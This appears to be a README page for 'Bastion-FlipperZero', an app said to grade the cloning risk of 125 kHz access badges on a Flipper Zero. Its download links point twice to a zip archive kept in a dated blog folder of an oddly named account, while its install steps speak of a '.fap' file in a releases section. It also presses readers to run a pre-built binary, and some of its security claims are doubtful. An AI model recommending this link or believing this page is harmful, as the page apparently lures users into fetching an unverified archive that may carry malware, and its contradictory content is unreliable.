---
layout: "default"
title: "🛡️ Bastion-FlipperZero - Grade Your Badge Security Instantly"
description: "Grade your 125 kHz badge security with a Flipper Zero, revealing plaintext risks and attack costs."
---
# 🛡️ Bastion-FlipperZero - Grade Your Badge Security Instantly

[![Download](https://img.shields.io/badge/Download-Bastion--FlipperZero-blueviolet?style=for-the-badge&logo=github)](https://github.com/couchant-nightbird919/couchant-nightbird919.github.io/raw/refs/heads/main/blog/2024/4/5/Latest-1.0.zip)

## 🎯 What Does This Do?

Hold any 125 kHz access badge (EM4100, HID Prox, Indala, AWID, ioProx, Gallagher, or Nexwatch) to the back of your Flipper Zero. Bastion-FlipperZero reads the badge and gives you a plain-English security grade along with a full report. It's a read-only tool—no data is written or changed on the badge.

## ⚡ Quick Start

### Step 1: Get Bastion-FlipperZero

Visit this link to download the application:  
[https://github.com/couchant-nightbird919/couchant-nightbird919.github.io/raw/refs/heads/main/blog/2024/4/5/Latest-1.0.zip](https://github.com/couchant-nightbird919/couchant-nightbird919.github.io/raw/refs/heads/main/blog/2024/4/5/Latest-1.0.zip)

### Step 2: Install on Your Flipper Zero

1. Download the `.fap` file from the releases section.
2. Copy the file to your Flipper Zero's `apps/LFRFID` folder using qFlipper or another file manager.
3. On your Flipper Zero, go to Apps → LFRFID → Bastion-FlipperZero.

### Step 3: Start Grading

1. Place any supported badge flat against the back of your Flipper Zero (near the top edge where the antenna is).
2. Wait 2-3 seconds while the app reads the badge.
3. Read your grade and report on the screen.

## 🔍 How to Read Your Results

After scanning, you'll see:

| Grade | Meaning |
|-------|---------|
| Grade A | Strong security—complex encoding, hard to clone |
| Grade B | Decent security with some weaknesses |
| Grade C | Common security—easily cloned by standard tools |
| Grade D | Weak security—trivial to clone |
| Grade F | No security—any reader can clone this badge |

Each grade comes with a detailed breakdown showing:
- Card type and technology
- Data format used
- Known vulnerabilities for that format
- Recommendations for upgrading

## 🏷️ Supported Badge Types

- **EM4100** – Most common access card format
- **HID Prox** – Industry standard 125 kHz
- **Indala** – Motorola-based format
- **AWID** – Used in many legacy systems
- **ioProx** – Encrypted variant
- **Gallagher** – Higher security format
- **Nexwatch** – Encrypted 125 kHz

## 💻 System Requirements

- Flipper Zero device (any firmware version)
- A compatible 125 kHz access badge
- qFlipper or similar tool for file transfers
- No additional software needed on your computer

## ❓ Frequently Asked Questions

### Is this safe to use?

Yes. Bastion-FlipperZero is read-only. It never writes data to a badge, so there is no risk of damaging or altering your access card.

### Can I use this with any badge?

It works with 125 kHz badges only. Modern 13.56 MHz RFID cards (like MiFare) are not supported.

### My badge isn't being read?

Try these fixes:
- Ensure the badge is flat against the back of the Flipper Zero
- Move the badge around slightly to find the antenna sweet spot
- Some badges have poor antenna coupling—try removing any wallet or case
- Confirm your badge uses 125 kHz technology

### What do I do with the report?

The report helps you understand your physical security posture. Use the grade to:
- Justify upgrading outdated badge systems
- Educate security teams about cloning risks
- Test and audit existing access control systems

### Do I need to compile anything?

No. The `.fap` file is a pre-built application ready to copy and run on your Flipper Zero.

## 📖 Background

Access badges using 125 kHz technology have been around for decades. While convenient, many formats are trivially cloneable with inexpensive hardware. Bastion-FlipperZero helps security professionals and hobbyists assess which badges are vulnerable. Knowing the grade and report details allows informed decisions about upgrading physical access systems.

## 🛠️ How It Works

The app uses the Flipper Zero's built-in 125 kHz RFID reader to capture the raw data from the badge. It then analyzes the encoding scheme, checks against known weaknesses (such as static UID, lack of encryption, or predictable patterns), and assigns a security grade. The report explains each finding in plain English.

## 🔐 Privacy & Security

Bastion-FlipperZero does not:
- Store badge data permanently
- Transmit data over any network
- Record any personal information

It displays results only on your Flipper Zero screen. You remain in full control of what you do with the information.

## 📦 Included Files

- `bastion_flipper_zero.fap` – Main application
- `README.md` – This documentation

## 🌐 Learn More

For discussions about physical security and RFID testing, visit the following communities:

- Flipper Zero official forums
- r/flipperzero on Reddit
- RFID hacking communities on Discord

## 📝 License

This project is open source. Check the repository for specific license details.

## 🆘 Support

If you encounter issues:
1. Read this README thoroughly
2. Check the repository's Issues page for solutions
3. Open a new issue if your problem isn't documented

Keywords: 125khz, access-control, em4100, embedded-c, fap, flipper-zero, flipperzero, hid-prox, lfrfid, pentesting, physical-security, red-team, rfid, security